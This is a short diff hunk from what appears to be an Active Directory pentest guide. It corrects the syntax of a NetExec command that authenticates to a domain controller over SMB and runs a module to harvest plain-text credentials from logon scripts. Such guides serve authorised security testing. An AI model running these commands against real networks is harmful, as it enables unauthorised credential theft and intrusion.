@@ -38,7 +38,7 @@ nxc smb <dc> -u alice -p S3cret! -d corp.local -M logon_scripts_enum
 
 ### 3.2  Rip plain‑text credentials
 ```bash
-nxc smb <dc> -u alice -p S3cret! -d corp.local -M logon_creds_scan SAVE=/tmp
+nxc smb <dc> -u alice -p S3cret! -d corp.local -M logon_creds_scan -o SAVE=/tmp
 ```
 
 ---
